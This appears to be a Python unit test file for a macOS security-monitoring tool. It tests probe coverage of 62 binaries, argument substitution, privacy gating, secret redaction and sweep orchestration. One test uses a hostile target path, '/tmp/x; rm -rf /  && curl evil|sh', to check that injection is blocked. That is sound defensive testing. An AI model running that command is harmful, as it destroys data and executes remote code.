"""Probe catalog, coverage accounting, and the sweep orchestrator."""

from __future__ import annotations

import os
import tempfile
import unittest

from macsiem import config as config_mod
from macsiem.evidence import native, orchestrator as orch_mod, probes as probes_mod
from macsiem.evidence import runner as runner_mod
from macsiem.rules import loader
from macsiem.store.db import Store
from macsiem.util.proc import FixtureRunner

FULL_CAPS = {"root": True, "fda": True, "session": True, "macos": True,
             "eslogger": True}
CTX = {"target_path": "/tmp/subject", "target_pid": "4242", "target_user": "alice",
       "window_start": "2026-09-11 20:00:00", "window_end": "2026-09-11 21:00:00"}


class TestCoverage(unittest.TestCase):
    """"All 62 binaries at once" has to be a checkable claim, not a slogan."""

    @classmethod
    def setUpClass(cls):
        cls.binaries = loader.load().binary_names()

    def test_every_loobin_has_an_explicit_status(self):
        report = probes_mod.coverage(self.binaries, FULL_CAPS, {"capture_content": True})
        self.assertEqual(len(report), 62)
        for name, entry in report.items():
            self.assertIn(entry["status"],
                          ("covered", "observational_only", "policy_excluded",
                           "unavailable"), name)

    def test_observational_binaries_name_substitute_evidence(self):
        report = probes_mod.coverage(self.binaries, FULL_CAPS, {"capture_content": True})
        ids = {probe.id for probe in probes_mod.CATALOG}
        for name, entry in report.items():
            if entry["status"] == "observational_only":
                self.assertTrue(entry["artifact_state"],
                                "%s is observational with no substitute evidence" % name)
                for probe_id in entry["artifact_state"]:
                    self.assertIn(probe_id, ids,
                                  "%s points at a probe that does not exist" % name)

    def test_disabling_content_capture_is_reported_not_hidden(self):
        report = probes_mod.coverage(self.binaries, FULL_CAPS,
                                     {"capture_content": False})
        excluded = [n for n, e in report.items() if e["status"] == "policy_excluded"]
        self.assertIn("screencapture", excluded)
        self.assertIn("pbpaste", excluded)

    def test_missing_capabilities_downgrade_honestly(self):
        report = probes_mod.coverage(self.binaries,
                                     {"root": False, "fda": False, "session": False,
                                      "macos": True}, {"capture_content": True})
        self.assertIn("unavailable", probes_mod.summarize_coverage(report))


class TestProbeRunner(unittest.TestCase):
    def setUp(self):
        self.runner = FixtureRunner(default={"stdout": "fixture\n", "returncode": 0})

    def run_probe(self, probe_id, ctx=None, config=None):
        return runner_mod.run_probe(
            probes_mod.BY_ID[probe_id],
            dict(CTX, _capabilities=FULL_CAPS, **(ctx or {})),
            runner=self.runner, config=config or {})

    def test_slots_are_substituted_into_single_argv_elements(self):
        result = self.run_probe("provenance.xattr")
        self.assertEqual(result["argv"], ["/usr/bin/xattr", "-l", "/tmp/subject"])

    def test_a_hostile_target_path_cannot_become_extra_arguments(self):
        """Substituted values come from events and are therefore untrusted."""
        result = self.run_probe(
            "provenance.xattr",
            {"target_path": "/tmp/x; rm -rf /  && curl evil|sh"})
        self.assertEqual(len(result["argv"]), 3)
        self.assertEqual(result["argv"][2], "/tmp/x; rm -rf /  && curl evil|sh")

    def test_missing_slot_skips_rather_than_guessing(self):
        result = runner_mod.run_probe(
            probes_mod.BY_ID["provenance.xattr"], {"_capabilities": FULL_CAPS},
            runner=self.runner, config={})
        self.assertIn("missing context", result["skipped_reason"])

    def test_capability_gating(self):
        result = runner_mod.run_probe(
            probes_mod.BY_ID["posture.profiles"],
            {"_capabilities": {"root": False, "fda": True, "session": True}},
            runner=self.runner, config={})
        self.assertEqual(result["skipped_reason"], "requires root")

    def test_privacy_gating(self):
        result = self.run_probe("content.clipboard",
                                config={"privacy": {"capture_content": False}})
        self.assertIn("content capture disabled", result["skipped_reason"])

    def test_secrets_are_redacted_from_probe_output(self):
        self.runner.add(["/usr/bin/pbpaste"],
                        stdout="AKIAIOSFODNN7EXAMPLE\npassword: hunter2\n")
        result = self.run_probe("content.clipboard",
                                config={"privacy": {"redact_secrets": True}})
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", result["stdout"])
        self.assertTrue(result["redactions"])


class TestNativeProbes(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()

    def test_sqlite_is_opened_read_only_and_immutable(self):
        import sqlite3
        path = os.path.join(self.dir, "TCC.db")
        connection = sqlite3.connect(path)
        connection.execute("CREATE TABLE access (service TEXT, client TEXT)")
        connection.execute("INSERT INTO access VALUES ('kTCCServiceScreenCapture','x')")
        connection.commit()
        connection.close()
        before = os.path.getmtime(path)
        out = native.read_sqlite({"paths": [path],
                                  "query": "SELECT service, client FROM access"})
        self.assertEqual(out["databases"][0]["rows"][0]["client"], "x")
        self.assertEqual(before, os.path.getmtime(path),
                         "reading the database modified it")

    def test_plist_reader_handles_binary_and_broken_files(self):
        import plistlib
        good = os.path.join(self.dir, "good.plist")
        with open(good, "wb") as handle:
            plistlib.dump({"Label": "com.example", "RunAtLoad": True}, handle,
                          fmt=plistlib.FMT_BINARY)
        bad = os.path.join(self.dir, "bad.plist")
        with open(bad, "w") as handle:
            handle.write("not a plist")
        out = native.read_plists({"paths": [good, bad]})
        self.assertEqual(out["files"][0]["plist"]["Label"], "com.example")
        self.assertIn("error", out["files"][1])


class TestOrchestrator(unittest.TestCase):
    def setUp(self):
        self.config = config_mod.load(environ={})
        self.root = tempfile.mkdtemp()
        self.config.set_path("paths.data_dir", self.root)
        self.store = Store(os.path.join(self.root, "t.db"))
        self.rulepack = loader.load()
        self.runner = FixtureRunner(default={"stdout": "fixture\n", "returncode": 0})

    def sweep(self, tier=orch_mod.TIER_FULL, **kwargs):
        orchestrator = orch_mod.Orchestrator(self.config, store=self.store,
                                             rulepack=self.rulepack,
                                             runner=self.runner)
        return orchestrator.sweep(tier=tier, ctx=dict(CTX, _capabilities=FULL_CAPS),
                                  bundle_dir=self.root, **kwargs)

    def test_full_sweep_runs_the_whole_catalog(self):
        result = self.sweep(use_cache=False)
        self.assertEqual(len(result["results"]), len(probes_mod.CATALOG))
        self.assertEqual(result["stats"]["failed"], 0)

    def test_scoped_sweep_is_much_smaller(self):
        full = self.sweep(use_cache=False)
        scoped = self.sweep(tier=orch_mod.TIER_SCOPED, use_cache=False)
        self.assertLess(len(scoped["results"]), len(full["results"]) / 2)

    def test_baseline_cache_is_reused(self):
        self.sweep(use_cache=False)
        second = self.sweep(use_cache=True)
        self.assertGreater(second["stats"]["from_cache"], 20)

    def test_coverage_is_attached_to_every_sweep(self):
        result = self.sweep(use_cache=False)
        self.assertEqual(len(result["coverage"]), 62)
        self.assertEqual(sum(result["coverage_summary"].values()), 62)

    def test_rate_limiting_downgrades_rather_than_dropping(self):
        self.config.set_path("sweep.max_full_sweeps_per_hour", 1)
        orchestrator = orch_mod.Orchestrator(self.config, store=self.store,
                                             rulepack=self.rulepack,
                                             runner=self.runner)
        first = orchestrator.sweep(tier=orch_mod.TIER_FULL, ctx={}, use_cache=False)
        second = orchestrator.sweep(tier=orch_mod.TIER_FULL, ctx={}, use_cache=False)
        self.assertEqual(first["tier"], orch_mod.TIER_FULL)
        self.assertEqual(second["tier"], orch_mod.TIER_SCOPED)
        self.assertTrue(second["rate_limited"])

    def test_sweep_registers_itself_with_the_engine(self):
        """Without this the sweep alerts on itself: many probes are LOOBins."""
        from macsiem.rules import engine as engine_mod
        engine = engine_mod.Engine(self.rulepack, self.config)
        orchestrator = orch_mod.Orchestrator(self.config, store=self.store,
                                             rulepack=self.rulepack,
                                             runner=self.runner, engine=engine)
        marked = []
        engine.mark_self = lambda pid: marked.append(pid)
        engine.unmark_self = lambda pid: None
        orchestrator.sweep(tier=orch_mod.TIER_SCOPED, ctx={}, use_cache=False)
        self.assertEqual(marked, [os.getpid()])


if __name__ == "__main__":
    unittest.main()
